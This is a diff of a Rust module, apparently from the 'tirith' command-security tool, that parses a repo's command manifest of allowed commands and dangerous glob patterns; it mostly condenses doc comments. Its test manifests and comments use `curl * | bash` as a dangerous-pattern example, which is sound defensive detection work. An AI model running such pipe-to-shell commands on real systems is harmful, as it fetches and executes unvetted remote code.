@@ -1,47 +1,32 @@
 //! M11 ch2 — repo command manifest (`.tirith/commands.yaml`).
 //!
-//! A repo-controlled, **suppression-BOUNDED** allowlist of commands. The
-//! manifest can do exactly two things, and NOTHING else:
+//! A repo-controlled, **suppression-BOUNDED** allowlist that can do exactly two
+//! things:
 //!
-//! 1. **Suppress one Info rule.** An exact match in `allowed[*]` suppresses
-//!    *only* [`RuleId::RepoCommandUnknown`] (Info) for the matched command —
-//!    the "this command is not in the repo's catalogue" annotation. It cannot
-//!    touch, downgrade, or remove any other finding.
+//! 1. **Suppress one Info rule.** An exact `allowed[*]` match suppresses *only*
+//!    [`RuleId::RepoCommandUnknown`] (Info) for that command. It cannot touch
+//!    any other finding.
 //! 2. **Elevate.** A `dangerous[*]` glob match ADDS a
-//!    [`RuleId::RepoCommandDangerousPattern`] finding, regardless of what the
-//!    engine already found. With `action: block` (the default) the finding is
-//!    High severity (which `action_from_findings` maps to [`Action::Block`]);
-//!    with `action: warn` it is Medium severity (→ Warn action). There is no
-//!    `Severity::Block` — "Block" names the *action*, derived from a High/
-//!    Critical severity. Stricter-is-safe; this is always allowed.
+//!    [`RuleId::RepoCommandDangerousPattern`] finding: `action: block` (default)
+//!    → High (→ [`Action::Block`]), `action: warn` → Medium (→ Warn).
+//!    Stricter-is-safe; always allowed.
 //!
 //! ## THE LOAD-BEARING INVARIANT
 //!
-//! The manifest **NEVER weakens** an engine finding of severity ≥ High. A
-//! compromised repo that adds `curl … | bash` to `allowed[]` MUST still block,
-//! because `action_from_findings` maps the engine's High/Critical
-//! `pipe_to_interpreter` finding to [`Action::Block`] and the manifest match
-//! changes nothing about that finding.
-//!
-//! This invariant is structural, not a runtime check: [`evaluate`] returns a
-//! list of findings to ADD plus the matched allowed-entry name for audit
-//! context. It is handed an immutable `&[Finding]` of what the engine already
-//! produced and has **no API** to mutate or drop any of those findings. The
-//! "suppression" of `RepoCommandUnknown` is implemented by *not emitting it*
-//! when an allowed entry matches — there is no code path that removes a
-//! pre-existing finding. A future refactor cannot accidentally re-couple the
-//! audit-name path to action derivation, because the audit name is a separate
-//! return field that the engine threads only into the audit log, never into
-//! `action_from_findings`.
+//! The manifest **NEVER weakens** an engine finding of severity ≥ High — a
+//! compromised repo that adds `curl … | bash` to `allowed[]` MUST still block.
+//! This is STRUCTURAL, not a runtime check: [`evaluate`] is handed an immutable
+//! `&[Finding]` and has **no API** to mutate or drop those findings; the
+//! "suppression" of `RepoCommandUnknown` is just *not emitting it*. The matched
+//! audit name is a separate return field threaded only into the audit log,
+//! never into `action_from_findings`.
 //!
 //! ## Pattern syntax (v1)
 //!
-//! `dangerous[*].pattern` supports glob `*` ONLY (matches any run of
-//! characters, including none). There is no `?`, no character classes, no
-//! regex. `allowed[*].command` is an EXACT string match (after trimming
-//! surrounding shell-significant whitespace — space/tab/newline/CR, see
-//! [`crate::command_card::is_shell_significant_ws`] — on both sides). This is
-//! documented in the starter file written by `tirith commands init`.
+//! `dangerous[*].pattern` supports glob `*` ONLY (no `?`, classes, or regex).
+//! `allowed[*].command` is an EXACT match after trimming surrounding
+//! shell-significant whitespace (space/tab/newline/CR, see
+//! [`crate::command_card::is_shell_significant_ws`]).
 
 use serde::{Deserialize, Serialize};
 use std::path::{Path, PathBuf};
@@ -61,17 +46,12 @@ pub struct AllowedEntry {
     pub command: String,
 }
 
-/// The action a `dangerous[*]` entry requests on a match.
+/// The action a `dangerous[*]` entry requests on a match: `block` → High
+/// finding (→ Block), `warn` → Medium (→ Warn).
 ///
-/// * `block` → adds a High `RepoCommandDangerousPattern` finding (→ Block).
-/// * `warn`  → adds a Medium `RepoCommandDangerousPattern` finding (→ Warn).
-///
-/// A missing `action` defaults to `block` (the strict, safe default). An
-/// UNKNOWN string value is REJECTED at deserialize time (serde has no catch-all
-/// arm here) — a typo'd action fails the manifest load rather than silently
-/// downgrading to a no-op, which preserves the "stricter is always safe"
-/// posture. Both arms ELEVATE (add a finding); neither can weaken an engine
-/// finding.
+/// Missing `action` defaults to `block`. An UNKNOWN value is REJECTED at
+/// deserialize time (no catch-all arm) — a typo fails the load rather than
+/// silently downgrading to a no-op. Both arms ELEVATE; neither can weaken.
 #[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq, Default)]
 #[serde(rename_all = "snake_case")]
 pub enum DangerousAction {
@@ -106,10 +86,9 @@ pub struct DangerousEntry {
 /// Parsed `.tirith/commands.yaml`.
 ///
 /// `deny_unknown_fields` is load-bearing: with `#[serde(default)]` on both
-/// lists, a typo'd top-level key (`dangerouss:` / `allowedd:`) would otherwise
-/// be silently ignored and the manifest would load with EMPTY lists — quietly
-/// disabling the operator's `dangerous[]` elevations. Rejecting unknown keys
-/// turns that typo into a loud parse error instead.
+/// lists, a typo'd top-level key (`dangerouss:`) would otherwise load EMPTY
+/// lists, silently disabling the operator's `dangerous[]` elevations. Rejecting
+/// unknown keys turns that typo into a loud parse error.
 #[derive(Debug, Clone, Default, Serialize, Deserialize, PartialEq, Eq)]
 #[serde(deny_unknown_fields)]
 pub struct CommandsManifest {
@@ -139,54 +118,36 @@ impl std::error::Error for ManifestError {}
 
 /// The result of evaluating a command against a manifest.
 ///
-/// SECURITY: this carries findings to ADD and an audit-only name. It does NOT
-/// carry any handle to the engine's existing findings — the manifest cannot
-/// remove or weaken them. See the module-level invariant.
-///
-/// (`Finding` is not `Eq`, so this is not `PartialEq`/`Eq`; tests assert on the
-/// individual fields — `findings` rule_ids/severities and
-/// `matched_allowed_name`.)
+/// SECURITY: carries findings to ADD plus an audit-only name; it holds NO handle
+/// to the engine's existing findings, so the manifest cannot weaken them (see
+/// the module-level invariant). Not `PartialEq`/`Eq` (`Finding` isn't `Eq`).
 #[derive(Debug, Clone, Default)]
 pub struct ManifestOutcome {
-    /// Findings the manifest contributes (at most one). Either a single
-    /// `RepoCommandUnknown` (Info) when the command is not catalogued, OR one
-    /// or more `RepoCommandDangerousPattern` (High → Block action for
-    /// `action: block`, Medium → Warn action for `action: warn`) when a
-    /// dangerous pattern matched. Never both: a dangerous match takes precedence
-    /// over the
-    /// "unknown" annotation (a dangerous command is, by definition, not a
-    /// benign uncatalogued one).
+    /// Findings the manifest contributes: a single `RepoCommandUnknown` (Info)
+    /// when uncatalogued, OR one+ `RepoCommandDangerousPattern` on a dangerous
+    /// match. Never both — a dangerous match takes precedence over "unknown".
     pub findings: Vec<Finding>,
-    /// The `allowed[*].name` of the entry that matched this command, if any.
-    /// AUDIT-CONTEXT ONLY — the engine logs this for traceability and MUST NOT
-    /// feed it into action derivation. `None` when no allowed entry matched.
+    /// The matched `allowed[*].name`, if any. AUDIT-CONTEXT ONLY — MUST NOT feed
+    /// into action derivation. `None` when no allowed entry matched.
     pub matched_allowed_name: Option<String>,
 }
 
 const MANIFEST_FILENAME: &str = "commands.yaml";
 
-/// Upper bound on the bytes read from `.tirith/commands.yaml`. The manifest is a
-/// list of allowed/dangerous command strings; 256 KiB is far more than a genuine
-/// one needs (thousands of entries). The file is REPO-controlled and read on the
-/// exec hot path, so the read goes through [`crate::util::read_regular_capped`]:
-/// a FIFO/device at the path cannot block the open and an oversized file cannot
-/// allocate unbounded — both are mapped to a fail-safe parse error (CodeRabbit
-/// R17 #1, read-guard class). Mirrors the engine card / incident-flag / salt
-/// reads that already use the hardened reader.
+/// Upper bound on bytes read from the REPO-controlled `.tirith/commands.yaml`
+/// (256 KiB ≫ any genuine manifest). The read goes through
+/// [`crate::util::read_regular_capped`] so a FIFO/device cannot block the open
+/// and an oversized file cannot allocate unbounded — both map to a fail-safe
+/// parse error (CodeRabbit R17 #1, read-guard class).
 const MANIFEST_READ_CAP: u64 = 256 * 1024;
 
 impl CommandsManifest {
     /// Parse a manifest from YAML text.
     ///
-    /// After deserializing, rejects a manifest with DUPLICATE `allowed[].name`
-    /// values (CodeRabbit R11 #5): `commands run <name>` and `match_allowed` are
-    /// first-match lookups, so two entries sharing a name make which one runs /
-    /// is reported ORDER-DEPENDENT and ambiguous. Failing the load turns that
-    /// latent ambiguity into a loud, fixable parse error rather than silent
-    /// first-wins behaviour. Duplicate `dangerous[].pattern` values are rejected
-    /// too — they are pure redundancy (every match already collects ALL matching
-    /// patterns), and a duplicated dangerous glob is almost always a copy-paste
-    /// mistake worth surfacing.
+    /// Rejects DUPLICATE `allowed[].name` (CodeRabbit R11 #5): first-match
+    /// lookups make a shared name order-dependent and ambiguous. Duplicate
+    /// `dangerous[].pattern` is rejected too — pure redundancy, almost always a
+    /// copy-paste mistake.
     pub fn from_yaml(text: &str) -> Result<Self, ManifestError> {
         let manifest: Self =
             serde_yaml::from_str(text).map_err(|e| ManifestError::Parse(e.to_string()))?;
@@ -194,18 +155,11 @@ impl CommandsManifest {
         Ok(manifest)
     }
 
-    /// Error on duplicate `allowed[].name` or duplicate `dangerous[].pattern`.
-    /// Names/patterns are deduped after trimming surrounding shell-significant
-    /// whitespace (space/tab/newline/CR — the same `is_shell_significant_ws`
-    /// predicate the matchers use), so two entries that differ ONLY by such
-    /// surrounding whitespace are rejected as the duplicates they effectively
-    /// are at match time (they would resolve to the same first-match key).
+    /// Error on duplicate `allowed[].name` or `dangerous[].pattern`. Dedup uses
+    /// the same `trim_shell_ws` key the matchers compare with, so two entries
+    /// differing ONLY by surrounding shell-significant whitespace are rejected as
+    /// the duplicates they effectively are at match time.
     fn validate_no_duplicates(&self) -> Result<(), ManifestError> {
-        // Dedup on the SAME shell-significant-whitespace-trimmed key the matchers
-        // compare with (`match_allowed`/`match_dangerous` use `trim_shell_ws`),
-        // so two entries that differ only by surrounding shell-significant
-        // whitespace are caught as the duplicates they effectively are at match
-        // time.
         let mut seen_names = std::collections::HashSet::with_capacity(self.allowed.len());
         for entry in &self.allowed {
             if !seen_names.insert(trim_shell_ws(&entry.name)) {
@@ -231,14 +185,12 @@ impl CommandsManifest {
 
     /// Load the manifest from a specific file path.
     ///
-    /// HARDENED READ (CodeRabbit R17 #1, read-guard class): the path is
-    /// REPO-controlled and read on the exec hot path (via [`Self::discover`]), so
-    /// a plain `std::fs::read_to_string` would BLOCK on a FIFO/device pointed at
-    /// the path, or allocate unbounded on a huge file. Route through
-    /// [`crate::util::read_regular_capped`] (opens `O_NONBLOCK`, fstats the open
-    /// fd, caps at [`MANIFEST_READ_CAP`]). A non-regular / oversized / non-UTF-8
-    /// file maps to a [`ManifestError::Parse`] — fail-SAFE, because the hot-path
-    /// caller treats any error as "no usable manifest" and never as permissive.
+    /// HARDENED READ (CodeRabbit R17 #1): the REPO-controlled path is read on the
+    /// exec hot path, so it routes through [`crate::util::read_regular_capped`]
+    /// (`O_NONBLOCK`, fstat, capped at [`MANIFEST_READ_CAP`]) instead of a plain
+    /// `read_to_string` that could block on a FIFO or allocate unbounded. A
+    /// non-regular/oversized/non-UTF-8 file maps to a fail-SAFE
+    /// [`ManifestError::Parse`] (the caller treats any error as "no manifest").
     pub fn load_from_path(path: &Path) -> Result<Self, ManifestError> {
         let bytes = match crate::util::read_regular_capped(path, MANIFEST_READ_CAP) {
             Ok(b) => b,
@@ -267,33 +219,25 @@ impl CommandsManifest {
         Self::from_yaml(&text)
     }
 
-    /// Cheap existence probe for the tier-1 force-past gate: does a
-    /// `.tirith/commands.yaml` exist for `cwd`? A single `symlink_metadata` stat
-    /// per candidate (see [`manifest_path_present`]), mirroring
-    /// [`crate::taint::store_nonempty`]. When this is
-    /// `false` the engine never reads the manifest, so a repo without one pays
-    /// nothing past the stat. See [`discover_manifest_path`].
+    /// Cheap existence probe for the tier-1 force-past gate: a single
+    /// `symlink_metadata` stat per candidate. When `false` the engine never
+    /// reads the manifest, so a repo without one pays nothing past the stat.
     pub fn exists_for(cwd: Option<&str>) -> bool {
         discover_manifest_path(cwd).is_some()
     }
 
     /// Discover and load `.tirith/commands.yaml` for the given cwd.
     ///
-    /// Resolution mirrors [`crate::policy::discover_local_policy_path`] so the
-    /// manifest lives next to `policy.yaml`:
+    /// Resolution mirrors [`crate::policy::discover_local_policy_path`]:
     /// `TIRITH_POLICY_ROOT/.tirith/commands.yaml` → walk up from `cwd` to the
-    /// `.git` boundary looking for `.tirith/commands.yaml`. Returns `Ok(None)`
-    /// when no manifest file exists (the common, no-manifest case), and
-    /// `Err(..)` only when a present file fails to read or parse.
+    /// `.git` boundary. `Ok(None)` when no manifest exists; `Err` only when a
+    /// present file fails to read or parse.
     ///
-    /// HOT PATH: this runs on every `engine::analyze`. The parse is backed by a
-    /// per-process cache keyed on `(resolved_path, mtime)` with a 5-second TTL —
-    /// mirroring [`crate::incident`] / [`crate::canary`] — so a repeated check
-    /// in the same repo re-reads + re-parses the YAML at most once per 5s (and
-    /// re-parses immediately if the file's mtime changes). Path resolution
-    /// (`discover_manifest_path`, a few `symlink_metadata` stats) still runs
-    /// each call; it is cheap and `cwd`-dependent, so it is intentionally not
-    /// cached.
+    /// HOT PATH (every `engine::analyze`): the parse is backed by a per-process
+    /// cache keyed on `(resolved_path, mtime)` with a 5s TTL, so a repeated check
+    /// re-parses at most once per 5s (and immediately on mtime change). Path
+    /// resolution still runs each call (cheap, cwd-dependent, intentionally
+    /// uncached).
     pub fn discover(cwd: Option<&str>) -> Result<Option<Self>, ManifestError> {
         match discover_manifest_path(cwd) {
             Some(path) => cached_load(&path).map(Some),
@@ -301,20 +245,14 @@ impl CommandsManifest {
         }
     }
 
-    /// True when `command` exactly matches an `allowed[*].command` (after
-    /// trimming surrounding shell-significant whitespace — space/tab/newline/CR,
-    /// see [`crate::command_card::is_shell_significant_ws`] — on both sides).
-    /// Returns the matching entry's `name` for audit context.
+    /// True when `command` exactly matches an `allowed[*].command` after trimming
+    /// surrounding shell-significant whitespace on both sides. Returns the
+    /// matching entry's `name` for audit context.
     ///
-    /// SHELL-SIGNIFICANT-WHITESPACE trim (CodeRabbit R9 #A), in lockstep with
-    /// the [`crate::command_card::Card::command_matches`] gate (which trims the
-    /// same narrower set — NOT `str::trim`, NOT even
-    /// [`char::is_ascii_whitespace`]). `str::trim` strips the full Unicode
-    /// `White_Space` set; a manifest entry padded with a Unicode-whitespace char
-    /// (e.g. a U+00A0 NO-BREAK SPACE) would then trim equal to an ASCII-space
-    /// command, disagreeing with the command-card gate (which would treat it as
-    /// a mismatch). Both comparators MUST agree on exactly which bytes are
-    /// whitespace, so manifest matching trims via `trim_shell_ws`.
+    /// The `trim_shell_ws` trim (CodeRabbit R9 #A) MUST stay in lockstep with the
+    /// [`crate::command_card::Card::command_matches`] gate: `str::trim` would
+    /// strip the full Unicode `White_Space` set (e.g. U+00A0) and disagree with
+    /// the card gate. Both comparators must agree on which bytes are whitespace.
     pub fn match_allowed(&self, command: &str) -> Option<&str> {
         let needle = trim_shell_ws(command);
         self.allowed
@@ -323,12 +261,8 @@ impl CommandsManifest {
             .map(|e| e.name.as_str())
     }
 
-    /// All `dangerous[*]` entries whose glob pattern matches `command`.
-    ///
-    /// SHELL-SIGNIFICANT-WHITESPACE trim on both the command and each pattern
-    /// (CodeRabbit R9 #A), matching [`Self::match_allowed`] and the command-card
-    /// gate — see that method's note. A Unicode-whitespace-padded
-    /// `dangerous[*].pattern` must not silently trim to a bare glob.
+    /// All `dangerous[*]` entries whose glob pattern matches `command`. Trims
+    /// shell-significant whitespace on both sides — see [`Self::match_allowed`].
     pub fn match_dangerous(&self, command: &str) -> Vec<&DangerousEntry> {
         let needle = trim_shell_ws(command);
         self.dangerous
@@ -337,42 +271,24 @@ impl CommandsManifest {
             .collect()
     }
 
-    /// Evaluate `command` against this manifest, given what the engine already
-    /// found (`engine_findings`, read-only).
+    /// Evaluate `command` against this manifest. Rules:
+    /// - A `dangerous[*]` match ADDS a `RepoCommandDangerousPattern` finding and
+    ///   is the whole contribution (no `RepoCommandUnknown`).
+    /// - Else if NOT in `allowed[*]`, ADD an Info `RepoCommandUnknown`.
+    /// - Else (in `allowed[*]`, no dangerous match), contribute NOTHING but
+    ///   record the matched name. This is the sole suppression.
     ///
-    /// Rules:
-    /// - A `dangerous[*]` match ADDS a `RepoCommandDangerousPattern` finding
-    ///   (elevation, always allowed) — High severity (→ Block action) for
-    ///   `action: block`, Medium (→ Warn action) for `action: warn`. When any
-    ///   dangerous pattern matches, that is the whole contribution (no
-    ///   `RepoCommandUnknown`).
-    /// - Otherwise, if the command is NOT in `allowed[*]`, ADD an Info
-    ///   `RepoCommandUnknown` finding.
-    /// - If the command IS in `allowed[*]` (and no dangerous match), contribute
-    ///   NOTHING but record the matched name for audit context. This is the
-    ///   sole suppression: it suppresses only the `RepoCommandUnknown` that
-    ///   would otherwise be emitted.
-    ///
-    /// `engine_findings` is accepted as an immutable `&[Finding]` but is
-    /// DELIBERATELY NOT READ (hence the `_` binding): the manifest's
-    /// contribution is computed purely from `command` and the manifest's own
-    /// `allowed[]`/`dangerous[]` entries. `RepoCommandUnknown` is emitted
-    /// regardless of what the engine found — the final action still follows the
-    /// engine's max severity over the combined list. Taking the slice by
-    /// shared reference with no mutation/return path is exactly what makes the
-    /// load-bearing "manifest cannot weaken an engine finding" invariant
-    /// STRUCTURAL: there is simply no API here to touch an existing finding.
+    /// `_engine_findings` is taken as an immutable slice but DELIBERATELY NOT
+    /// READ (the `_` binding): with no mutation/return path, the "manifest cannot
+    /// weaken an engine finding" invariant is STRUCTURAL — there is no API to
+    /// touch an existing finding.
     pub fn evaluate(&self, command: &str, _engine_findings: &[Finding]) -> ManifestOutcome {
         let matched_allowed_name = self.match_allowed(command).map(str::to_string);
 
         let dangerous = self.match_dangerous(command);
         if !dangerous.is_empty() {
-            // Elevation path: stricter is always safe. We still record the
-            // matched allowed name (if any) for audit context, but the
-            // dangerous finding stands regardless — a repo that lists a
-            // command under BOTH `allowed` and `dangerous` gets blocked
-            // (dangerous wins; you cannot allow-list your way out of a
-            // dangerous pattern).
+            // Elevation path: dangerous wins even if also in `allowed` — you
+            // cannot allow-list your way out of a dangerous pattern.
             let findings = dangerous
                 .iter()
                 .map(|e| dangerous_finding(&e.pattern, command, e.action))
@@ -384,18 +300,15 @@ impl CommandsManifest {
         }
 
         if matched_allowed_name.is_some() {
-            // Suppression path: the command is catalogued. Suppress the
-            // `RepoCommandUnknown` annotation (by not emitting it). Contribute
-            // nothing else — the engine's other findings are untouched.
+            // Suppression path: catalogued — suppress `RepoCommandUnknown` by not
+            // emitting it; contribute nothing else.
             ManifestOutcome {
                 findings: Vec::new(),
                 matched_allowed_name,
             }
         } else {
-            // Annotation path: the command cleared the engine but is not in the
-            // repo's catalogue. Emit the Info note. Action still follows the
-            // engine's findings (Info never raises the action above Allow on
-            // its own, and never lowers a higher action).
+            // Annotation path: not catalogued — emit the Info note (never raises
+            // or lowers the action).
             ManifestOutcome {
                 findings: vec![unknown_finding(command)],
                 matched_allowed_name: None,
@@ -417,12 +330,8 @@ fn unknown_finding(command: &str) -> Finding {
             .to_string(),
         evidence: vec![Evidence::CommandPattern {
             pattern: "allowed[*].command (exact match)".to_string(),
-            // Shell-significant-whitespace trim (CodeRabbit R12 #G): the reported
-            // `matched` value MUST be exactly what the `match_allowed`/
-            // `trim_shell_ws` matcher saw. A Unicode `str::trim` here would strip
-            // non-shell-significant whitespace (e.g. U+00A0) that the matcher
-            // KEPT, so the evidence would not reflect the bytes that actually
-            // (mis)matched.
+            // R12 #G: trim with `trim_shell_ws` (not `str::trim`) so the evidence
+            // reflects exactly the bytes the matcher saw.
             matched: trim_shell_ws(command).to_string(),
         }],
         human_view: None,
@@ -433,15 +342,12 @@ fn unknown_finding(command: &str) -> Finding {
 }
 
 /// Build the Info finding surfaced when a `.tirith/commands.yaml` is PRESENT but
-/// could not be loaded (malformed YAML, a non-regular file, oversized, etc.).
+/// could not be loaded (malformed YAML, non-regular file, oversized, etc.).
 ///
-/// Reuses [`RuleId::RepoCommandUnknown`] (Info) rather than minting a new id: a
-/// broken manifest is, from the verdict's perspective, the same "this command is
-/// not catalogued by the manifest" state — except the operator is also told WHY
-/// (their manifest is broken and its `allowed[]`/`dangerous[]` rules are not
-/// being applied), instead of the engine silently ignoring it. Info-only: this
-/// never raises the action and, like every manifest finding, never weakens an
-/// engine finding. `reason` is the [`ManifestError`] `Display` string.
+/// Reuses [`RuleId::RepoCommandUnknown`] (Info) — the verdict-level state is the
+/// same "not catalogued", except the operator is told WHY. Info-only: never
+/// raises the action, never weakens an engine finding. `reason` is the
+/// [`ManifestError`] `Display` string.
 pub(crate) fn unloadable_finding(reason: &str) -> Finding {
     Finding {
         rule_id: RuleId::RepoCommandUnknown,
@@ -484,12 +390,8 @@ fn dangerous_finding(pattern: &str, command: &str, action: DangerousAction) -> F
              explicitly flagged this shape to {action_word}.",
             trim_shell_ws(pattern)
         ),
-        // Shell-significant-whitespace trim (CodeRabbit R12 #G): both the
-        // `pattern` and the `matched` command in the evidence MUST be exactly the
-        // strings the `match_dangerous`/`glob_match` matcher compared, so the
-        // reported evidence reflects what actually matched (a Unicode `str::trim`
-        // would diverge on the non-shell-significant whitespace the matcher
-        // preserved).
+        // R12 #G: trim with `trim_shell_ws` so the evidence reflects exactly what
+        // the matcher compared.
         evidence: vec![Evidence::CommandPattern {
             pattern: trim_shell_ws(pattern).to_string(),
             matched: trim_shell_ws(command).to_string(),
@@ -503,10 +405,8 @@ fn dangerous_finding(pattern: &str, command: &str, action: DangerousAction) -> F
 
 // ---- Hot-path parse cache -------------------------------------------------
 
-/// Per-process cache of a parsed manifest, keyed on the resolved file path.
-/// Mirrors [`crate::incident`] / [`crate::canary`]: load once, 5-second TTL,
-/// re-parse on the file's mtime change. Keyed on the resolved manifest PATH
-/// (not `cwd`), so multiple cwds resolving to the same manifest share the entry.
+/// Per-process cache of a parsed manifest, keyed on the resolved PATH (not
+/// `cwd`): load once, 5s TTL, re-parse on mtime change.
 struct CacheState {
     path: PathBuf,
     manifest: CommandsManifest,
@@ -527,10 +427,9 @@ fn manifest_mtime_nanos(path: &Path) -> u128 {
         .unwrap_or(0)
 }
 
-/// Load + parse the manifest at `path` through the per-process cache. Reloads
-/// when the cached path differs, the TTL expired, or the file's mtime changed.
-/// A parse/IO error is NOT cached (so a transient error does not stick): it is
-/// returned and the cache is left for the next call to retry.
+/// Load + parse the manifest at `path` through the cache. Reloads on path
+/// change, TTL expiry, or mtime change. A parse/IO error is NOT cached so a
+/// transient error does not stick.
 fn cached_load(path: &Path) -> Result<CommandsManifest, ManifestError> {
     let cur_mtime = manifest_mtime_nanos(path);
     let now = Instant::now();
@@ -566,28 +465,18 @@ pub fn invalidate_cache() {
     *guard = None;
 }
 
-/// Does a path ENTRY exist at `candidate` — even if it is a symlink, directory,
-/// or FIFO?
+/// Does a path ENTRY exist at `candidate`, even a symlink/directory/FIFO?
 ///
-/// CodeRabbit R19 #1: presence detection must NOT use `Path::is_file()`. That
-/// FOLLOWS symlinks and coerces metadata/IO failures + non-regular entries (a
-/// directory, FIFO, dangling symlink) to `false`, so a PRESENT-but-broken
-/// `.tirith/commands.yaml` would be read as ABSENT — the discovery walk would
-/// step right over it and the suppression-bounded note + dangerous-glob
-/// enforcement would both silently vanish. Use `symlink_metadata` instead (it
-/// does NOT traverse the final symlink): any extant entry — regular file,
-/// directory, FIFO, even a dangling symlink — counts as PRESENT and STOPS the
-/// walk, leaving the present-but-not-a-regular-file case to the hardened
-/// [`CommandsManifest::load_from_path`] (round-17 `read_regular_capped`), which
-/// fail-SAFELY surfaces it as a parse error rather than "no manifest, walk on".
+/// CodeRabbit R19 #1: must NOT use `Path::is_file()` — it follows symlinks and
+/// coerces non-regular/error entries to `false`, so a present-but-broken
+/// manifest would read as ABSENT and the discovery walk would step over it,
+/// silently dropping the suppression note + dangerous-glob enforcement.
+/// `symlink_metadata` instead: any extant entry STOPS the walk, leaving the
+/// not-a-regular-file case to the hardened [`CommandsManifest::load_from_path`].
 ///
-/// FAIL-SAFE on stat errors (CodeRabbit R13f, sibling of the incident/taint cache
-/// reads): only a genuine `NotFound` means absent. ANY OTHER `symlink_metadata`
-/// error (`EACCES`, a symlink loop, an I/O fault) means the entry is PRESENT but
-/// unstattable — treat it as present so discovery stops here and surfaces the
-/// unloadable manifest, rather than stepping over it (which would silently drop
-/// the repo-manifest note AND `dangerous[]` enforcement for a manifest that is
-/// really there).
+/// FAIL-SAFE (CodeRabbit R13f): only a genuine `NotFound` means absent; any
+/// other stat error (`EACCES`, symlink loop, I/O fault) is treated as PRESENT so
+/// discovery surfaces the unloadable manifest rather than stepping over it.
 fn manifest_path_present(candidate: &Path) -> bool {
     match candidate.symlink_metadata() {
         Ok(_) => true,
@@ -615,9 +504,8 @@ fn discover_manifest_path(cwd: Option<&str>) -> Option<PathBuf> {
         if manifest_path_present(&candidate) {
             return Some(candidate);
         }
-        // `.git` may be a directory or a file (worktrees); `.exists()` handles
-        // both. Stop at the repo boundary so we never escape into a parent
-        // repo's manifest.
+        // `.git` may be a dir or a file (worktrees); stop at the repo boundary so
+        // we never escape into a parent repo's manifest.
         if current.join(".git").exists() {
             return None;
         }
@@ -674,38 +562,28 @@ dangerous:
     action: block
 "#;
 
-/// Trim ONLY the shell-significant whitespace a shell treats as a TOKEN
-/// SEPARATOR (space, tab, newline, CR), never the full Unicode `White_Space`
-/// set and never `\x0C` FORM FEED. Load-bearing for the manifest
-/// command/pattern comparison (CodeRabbit R9 #A, narrowed R13 #3): it MUST
-/// agree, byte-for-byte, with the
-/// [`crate::command_card::Card::command_matches`] mismatch gate on which bytes
-/// count as surrounding whitespace, so it shares the SAME predicate
-/// (`command_card::is_shell_significant_ws`). `str::trim` would strip
-/// U+00A0 / U+2007 / etc., and `str::trim_ascii` / `char::is_ascii_whitespace`
-/// would strip a form feed — either would let a padded manifest entry match a
-/// command the command-card gate would reject; the two must not disagree on
-/// whitespace. The name deliberately does NOT say "ascii": this is the narrower
-/// shell-significant set, and a maintainer must not "simplify" it to
-/// `str::trim_ascii()` (which would reintroduce a form-feed match bypass).
+/// Trim ONLY shell-significant whitespace (space/tab/newline/CR), never the full
+/// Unicode `White_Space` set and never `\x0C` FORM FEED. Load-bearing (CodeRabbit
+/// R9 #A, R13 #3): it MUST agree byte-for-byte with the
+/// [`crate::command_card::Card::command_matches`] gate via the shared
+/// `is_shell_significant_ws` predicate. Do NOT "simplify" to `str::trim` (strips
+/// U+00A0 …) or `str::trim_ascii` (strips form feed) — either reintroduces a
+/// match bypass.
 fn trim_shell_ws(s: &str) -> &str {
     s.trim_matches(crate::command_card::is_shell_significant_ws)
 }
 
-/// Minimal glob matcher supporting only the `*` wildcard (matches any run of
-/// characters, including the empty string). No `?`, no character classes, no
-/// regex. Anchored at both ends (the whole `text` must be consumed).
-///
-/// Implemented as a classic two-pointer backtracking matcher over chars so it
-/// is correct for non-ASCII input and has no external dependency.
+/// Minimal glob matcher supporting only `*` (any run, incl. empty), anchored at
+/// both ends. A two-pointer backtracking matcher over chars (non-ASCII safe, no
+/// external dependency).
 fn glob_match(pattern: &str, text: &str) -> bool {
     let p: Vec<char> = pattern.chars().collect();
     let t: Vec<char> = text.chars().collect();
 
-    let mut pi = 0usize; // index into pattern
-    let mut ti = 0usize; // index into text
-    let mut star_pi: Option<usize> = None; // last '*' position in pattern
-    let mut star_ti = 0usize; // text index when last '*' was seen
+    let mut pi = 0usize;
+    let mut ti = 0usize;
+    let mut star_pi: Option<usize> = None;
+    let mut star_ti = 0usize;
 
     while ti < t.len() {
         if pi < p.len() && p[pi] == '*' {
@@ -726,7 +604,6 @@ fn glob_match(pattern: &str, text: &str) -> bool {
         }
     }
 
-    // Consume any trailing '*' in the pattern.
     while pi < p.len() && p[pi] == '*' {
         pi += 1;
     }
@@ -755,9 +632,8 @@ mod tests {
 
     #[test]
     fn unknown_top_level_key_is_rejected() {
-        // F2 (Major): a typo'd top-level key must FAIL the load rather than be
-        // silently ignored (which would load empty lists and disable the
-        // operator's elevations). `deny_unknown_fields` enforces this.
+        // F2: a typo'd top-level key must FAIL the load, not silently load empty
+        // lists. `deny_unknown_fields` enforces this.
         let typo = "dangerouss:\n  - pattern: \"curl * | bash\"\n";
         let err = CommandsManifest::from_yaml(typo)
             .expect_err("a misspelled top-level key must be a parse error");
@@ -771,9 +647,8 @@ mod tests {
 
     #[test]
     fn duplicate_allowed_name_is_rejected() {
-        // CodeRabbit R11 #5: two `allowed[]` entries sharing a `name` make
-        // `commands run <name>` / `match_allowed` order-dependent. The load must
-        // FAIL with a clear error rather than silently pick the first.
+        // CodeRabbit R11 #5: a shared `name` makes lookups order-dependent; the
+        // load must FAIL rather than silently pick the first.
         let dup = "allowed:\n  - name: build\n    command: npm run build\n  - name: build\n    command: make\n";
         let err = CommandsManifest::from_yaml(dup)
             .expect_err("a duplicate allowed[].name must be a parse error");
@@ -794,10 +669,8 @@ mod tests {
 
     #[test]
     fn duplicate_names_differing_only_by_shell_whitespace_are_rejected() {
-        // CodeRabbit R20: the matchers compare shell-significant-whitespace-
-        // trimmed, so `"build"` and `"build "` are the SAME command at match
-        // time — dedup must use the same normalization and reject them as
-        // duplicates.
+        // CodeRabbit R20: `"build"` and `"build "` trim equal at match time, so
+        // dedup must reject them as duplicates.
         let dup =
             "allowed:\n  - name: \"build\"\n    command: a\n  - name: \"build \"\n    command: b\n";
         let err = CommandsManifest::from_yaml(dup).expect_err(
@@ -812,8 +685,7 @@ mod tests {
 
     #[test]
     fn duplicate_dangerous_pattern_is_rejected() {
-        // CodeRabbit R11 #5: a duplicated dangerous glob is pure redundancy and
-        // almost always a copy-paste mistake — reject it at load.
+        // CodeRabbit R11 #5: a duplicated dangerous glob is pure redundancy — reject at load.
         let dup = "dangerous:\n  - pattern: \"curl * | bash\"\n  - pattern: \"curl * | bash\"\n    action: warn\n";
         let err = CommandsManifest::from_yaml(dup)
